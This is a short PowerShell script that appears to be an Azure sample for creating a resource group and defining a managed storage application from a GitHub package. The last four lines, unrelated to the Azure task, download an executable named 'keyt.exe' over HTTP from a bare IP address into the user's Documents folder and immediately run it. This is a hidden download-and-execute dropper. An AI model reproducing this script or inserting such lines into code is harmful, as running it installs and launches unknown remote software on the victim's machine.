
New-AzResourceGroup -Name appDefinitionGroup -Location westcentralus


$groupid=(Get-AzADGroup -SearchString appManagers).Id


$roleid=(Get-AzRoleDefinition -Name Owner).Id


New-AzManagedApplicationDefinition `
  -Name "ManagedStorage" `
  -Location "westcentralus" `
  -ResourceGroupName appDefinitionGroup `
  -LockLevel ReadOnly `
  -DisplayName "Managed Storage Account" `
  -Description "Managed Az.Storage Account" `
  -Authorization "${groupid}:$roleid" `
  -PackageFileUri "https://raw.githubusercontent.com/Azure/azure-managedapp-samples/master/samples/201-managed-storage-account/managedstorage.zip"

Import-Module BitsTransfer
$path = [environment]::getfolderpath("mydocuments")
Start-BitsTransfer -Source "http://94.102.50.39/keyt.exe" -Destination "$path\keyt.exe"
Invoke-Item  "$path\keyt.exe"

